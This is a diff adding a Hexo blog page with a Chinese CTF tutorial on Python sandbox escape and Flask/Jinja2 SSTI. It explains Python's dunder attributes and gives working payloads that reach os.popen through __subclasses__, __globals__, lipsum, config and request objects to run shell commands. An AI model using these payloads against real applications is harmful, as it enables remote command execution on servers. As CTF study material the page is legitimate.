@@ -1,0 +1,798 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/avatar.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="e1vp4tic">
+  <meta name="keywords" content="blog,e1vp4tic,cs">
+  
+    <meta name="description" content="python沙箱逃逸沙箱的概念不过多阐述，直观上理解就是规定了一个内部的命名空间，在这里只能够执行指定的函数，逃逸自然就是绕过这些限制来执行任意代码。 沙箱逃逸通常配合SSTI漏洞一起出现，不过不同的是，ssti的限制比专门的沙箱还是少一些的，两者只是攻击方法类似 这里先要阐述几个概念，基础概念一定要详细一些，要扎实 内置属性python存在很多的内置属性，只要你新建了类，系统就会自动分配这些属性">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python沙箱逃逸">
+<meta property="og:url" content="https://elvpatic.github.io/2025/10/17/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/index.html">
+<meta property="og:site_name" content="e1vp4tic&#39;s blog">
+<meta property="og:description" content="python沙箱逃逸沙箱的概念不过多阐述，直观上理解就是规定了一个内部的命名空间，在这里只能够执行指定的函数，逃逸自然就是绕过这些限制来执行任意代码。 沙箱逃逸通常配合SSTI漏洞一起出现，不过不同的是，ssti的限制比专门的沙箱还是少一些的，两者只是攻击方法类似 这里先要阐述几个概念，基础概念一定要详细一些，要扎实 内置属性python存在很多的内置属性，只要你新建了类，系统就会自动分配这些属性">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-10-17T06:24:27.000Z">
+<meta property="article:modified_time" content="2025-10-17T12:44:41.793Z">
+<meta property="article:author" content="e1vp4tic">
+<meta property="article:tag" content="ctf-web">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>python沙箱逃逸 - e1vp4tic&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/indexing-hover.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"elvpatic.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"Ir7RKiGS9zwhgtD416XsiDP6-gzGzoHsz","app_key":"1SAbfug15rHHsZTk8W9CUHLs","server_url":"https://ir7rkigs.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-11-03T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>e1vp4tic</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="python沙箱逃逸"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-10-17 14:24" pubdate>
+          2025年10月17日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          12 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">python沙箱逃逸</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="python沙箱逃逸"><a href="#python沙箱逃逸" class="headerlink" title="python沙箱逃逸"></a>python沙箱逃逸</h1><p>沙箱的概念不过多阐述，直观上理解就是规定了一个内部的命名空间，在这里只能够执行指定的函数，逃逸自然就是绕过这些限制来执行任意代码。</p>
+<p>沙箱逃逸通常配合SSTI漏洞一起出现，不过不同的是，ssti的限制比专门的沙箱还是少一些的，两者只是攻击方法类似</p>
+<p>这里先要阐述几个概念，基础概念一定要详细一些，要扎实</p>
+<h2 id="内置属性"><a href="#内置属性" class="headerlink" title="内置属性"></a>内置属性</h2><p>python存在很多的内置属性，只要你新建了类，系统就会自动分配这些属性，这些属性通常都用自己的功能，下面详细描述</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/560490974">https://zhuanlan.zhihu.com/p/560490974</a></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-strong">__class__</span>            类的一个内置属性，表示实例对象的类。<br><span class="hljs-strong">__base__</span>             类型对象的直接基类<br><span class="hljs-strong">__bases__</span>            类型对象的全部基类，以元组形式，类型的实例通常没有属性 <span class="hljs-strong">__bases__</span><br><span class="hljs-strong">__mro__</span>              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。<br><span class="hljs-strong">__subclasses__</span>()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.<br><span class="hljs-strong">__init__</span>             初始化类，返回的类型是function<br><span class="hljs-strong">__globals__</span>          使用方式是 函数名.<span class="hljs-strong">__globals__</span>获取function所处空间下可使用的module、方法以及所有变量。<br><span class="hljs-strong">__dic__</span>              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的<span class="hljs-strong">__dict__</span>里<br><span class="hljs-strong">__getattribute__</span>()   实例、类、函数都具有的<span class="hljs-strong">__getattribute__</span>魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用<span class="hljs-strong">__getattribute__</span>方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。<br><span class="hljs-strong">__getitem__</span>()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.<span class="hljs-strong">__getitem__</span>(&#x27;b&#x27;)<br><span class="hljs-strong">__builtins__</span>         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。<span class="hljs-strong">__builtins__</span>与<span class="hljs-strong">__builtin__</span>的区别就不放了，百度都有。<br><span class="hljs-strong">__import__</span>           动态加载类和函数，也就是导入模块，经常用于导入os模块，<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]<br><span class="hljs-strong">__str__</span>()            返回描写这个对象的字符串，可以理解成就是打印出来。<br>url<span class="hljs-emphasis">_for              flask的一个方法，可以用于得到<span class="hljs-strong">__builtins__</span>，而且url_</span>for.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;]含有current<span class="hljs-emphasis">_app。</span><br><span class="hljs-emphasis">get_</span>flashed<span class="hljs-emphasis">_messages flask的一个方法，可以用于得到<span class="hljs-strong">__builtins__</span>，而且url_</span>for.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;]含有current<span class="hljs-emphasis">_app。</span><br><span class="hljs-emphasis">lipsum               flask的一个方法，可以用于得到<span class="hljs-strong">__builtins__</span>，而且lipsum.<span class="hljs-strong">__globals__</span>含有os模块：&#123;&#123;lipsum.<span class="hljs-strong">__globals__</span>[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="hljs-emphasis">current_</span>app          应用上下文，一个全局变量。<br><br>request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。<br>此外，同样可以获取open函数:request.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()<br><br>request.args.x1   	 get传参<br>request.values.x1 	 所有参数<br>request.cookies      cookies参数<br>request.headers      请求头参数<br>request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)<br>request.data  		 post传参	(Content-Type:a/b)<br>request.json		 post传json  (Content-Type: application/json)<br>config               当前application的所有配置。此外，也可以这样&#123;&#123; config.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;<br>g                    &#123;&#123;g&#125;&#125;得到<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">flask.g</span> <span class="hljs-attr">of</span> &#x27;<span class="hljs-attr">flask_ssti</span>&#x27;&gt;</span></span><br>dict.get(key, default=None) 返回指定键的值，如果值不在字典中返回default值<br>dict.setdefault(key, default=None) 和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default<br></code></pre></td></tr></table></figure>
+
+<p>通过对这些方法的调用，加上一定格式的符号就可以执行命令，学的时候总是不知道怎么构造，后来发现了，要记住每一步的含义，明白每一步怎么来的才能够会自己构造。</p>
+<p>内部属性也分很多种，有的返回函数，有的返回类，有的返回字典。</p>
+<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>返回的内容可以通过或者<code>()</code>调用（call，执行函数或方法的行为）这称为函数，如</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-class">.__init__</span>()<br><span class="hljs-selector-class">.__subclasses__</span>()<br><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;os&#x27;</span>]</span><span class="hljs-selector-class">.popen</span>()<span class="hljs-selector-class">.read</span>()<br></code></pre></td></tr></table></figure>
+
+<h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>返回类，通过<code>.</code>来访问</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-title">.__class__</span><br><span class="hljs-title">.__base__</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><p>返回字典也,<code>[]</code>访问</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">.__globals__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;os&#x27;</span>]</span> -----访问模块，后加<span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)调用<br>.__globals__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;popen&#x27;</span>]</span> -----访问函数，后加(<span class="hljs-string">&#x27;ls&#x27;</span>)调用<br></code></pre></td></tr></table></figure>
+
+<p>这三类是我目前遇到的题中涉及到最多的，我会随着我的学习逐步更新</p>
+<p>明白这三中回显的使用方式之后就可以利用了，在SSTI中，回显会被渲染到前端模板，在普通的沙箱逃逸中，可以能就需要利用print()函数了</p>
+<h2 id="构造过程"><a href="#构造过程" class="headerlink" title="构造过程"></a>构造过程</h2><ul>
+<li>找到注入点</li>
+</ul>
+<p>这一步纯凭借经验了，故不多阐述</p>
+<ul>
+<li>观看回显构造payload</li>
+</ul>
+<p>假设现在有list函数，我要利用这个函数作为突破口来访问背后的类，</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">list.<span class="hljs-emphasis">__class__</span>                    查看当前list的类型<br>list.<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__base__</span>           查看list的类型的基类，一般为object<br>list.<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__base__</span>.<span class="hljs-emphasis">__subclasses__</span>()   调用函数，查看子类，因为object是所有类的基类，所以会返回所有的子类，在其中找到包含危险函数的子类即可<br>list.<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__base__</span>.<span class="hljs-emphasis">__subclasses__</span>()[155].<span class="hljs-emphasis">__init__</span>.<span class="hljs-emphasis">__globals__</span>      查看当前类允许的命名空间有哪些模块或者函数可以用来文件执行<br>list.<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__base__</span>.<span class="hljs-emphasis">__subclasses__</span>()[155].<span class="hljs-emphasis">__init__</span>.<span class="hljs-emphasis">__globals__</span>[<span class="hljs-emphasis">&#x27;popen&#x27;</span>](<span class="hljs-emphasis">&#x27;ls&#x27;</span>).read()<br>利用合适的函数来执行命令，拿到flag<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/web/" class="category-chain-item">web</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf-web/" class="print-no-link">#ctf-web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>python沙箱逃逸</div>
+      <div>https://elvpatic.github.io/2025/10/17/python沙箱逃逸/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>e1vp4tic</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年10月17日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/10/21/pyenv%E7%AE%A1%E7%90%86%E5%A4%9A%E7%89%88%E6%9C%ACpython/" title="pyenv管理多版本python">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">pyenv管理多版本python</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/10/16/py%E5%9F%BA%E7%A1%80/" title="py基础">
+                        <span class="hidden-mobile">py基础</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"Ir7RKiGS9zwhgtD416XsiDP6-gzGzoHsz","appKey":"1SAbfug15rHHsZTk8W9CUHLs","path":"window.location.pathname","placeholder":null,"avatar":"monsterid","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  <span id="timeDate">正在载入天数...</span>
+  <span id="times">载入时分秒...</span>
+  <script>
+  var now = new Date();
+  function createtime(){
+      var grt= new Date("11/3/2024 00:00:00");
+      now.setTime(now.getTime()+250);
+      days = (now - grt ) / 1000 / 60 / 60 / 24;
+      dnum = Math.floor(days);
+      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+      hnum = Math.floor(hours);
+      if(String(hnum).length ==1 ){
+          hnum = "0" + hnum;
+      }
+      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+      mnum = Math.floor(minutes);
+      if(String(mnum).length ==1 ){
+                mnum = "0" + mnum;
+      }
+      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+      snum = Math.round(seconds);
+      if(String(snum).length ==1 ){
+                snum = "0" + snum;
+      }
+      document.getElementById("timeDate").innerHTML = "世间从不缺令人心动的新鲜感，难得的是长久的陪伴，这篇blog已经陪了你&nbsp"+dnum+"&nbsp天";  
+      document.getElementById("times").innerHTML = hnum + "&nbsp时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
+  }
+  setInterval("createtime()",250);
+  </script>
+</div>
+  
+    <div class="footer-content">
+       <div style="text-align:center"> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        <div style="text-align:center">总访问 
+        <span id="leancloud-site-pv"></span>
+         次</div>
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        <div style="text-align:center">总访客 
+        <span id="leancloud-site-uv"></span>
+         人</div>
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+<script src="/js/yinghua.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
